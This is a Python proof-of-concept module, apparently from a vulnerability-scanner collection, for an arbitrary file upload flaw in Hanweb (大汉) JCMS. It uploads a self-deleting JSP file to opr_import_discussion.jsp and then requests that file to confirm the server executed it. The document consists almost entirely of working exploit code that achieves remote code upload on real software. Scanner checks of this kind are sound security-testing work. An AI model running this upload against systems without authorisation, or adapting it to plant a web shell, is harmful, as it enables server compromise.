# coding: utf-8
import requests

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Hanweb_0101'  # 平台漏洞编号，留空
    name = '大汉JCMS /opr_import_discussion.jsp 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2014-10-23'  # 漏洞公布时间
    desc = '''
    http://127.0.0.1/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S
    可上传文件,未限制上传文件类型,导致任意文件上传漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=075585'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Hanweb(大汉)'  # 漏洞应用名称
    product_version = '大汉JCMS'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ac682765-3eea-4359-a7c1-9a348a551117'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + "/jcms/jcms_files/jcms/web0/site/module/idea/tem/upload/v.jsp"
            target_url = self.target + \
                "/jcms/m_5_e/module/idea/opr_import_discussion.jsp?typeid=0&fn_billstatus=S"
            file_v_jsp = '''<%@ page import="java.util.*,java.io.*" %>
            <%@ page import="java.io.*"%>
            <%
            String path=application.getRealPath(request.getRequestURI());
            File d=new File(path);
            out.println(path);
            if(d.exists()){
            d.delete();
            }
            %>
            <% out.println("00799a96dcc29282dd74e23e49b647a6a");%>
            '''
            files = {'file': ('v.jsp', file_v_jsp, 'multipart/form-data')}

            response = requests.post(target_url, files=files)  # \u4e0a\u4f20
            response = requests.get(verify_url)  # \u9a8c\u8bc1
            content = response.text
            if '00799a96dcc29282dd74e23e49b647a6a' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
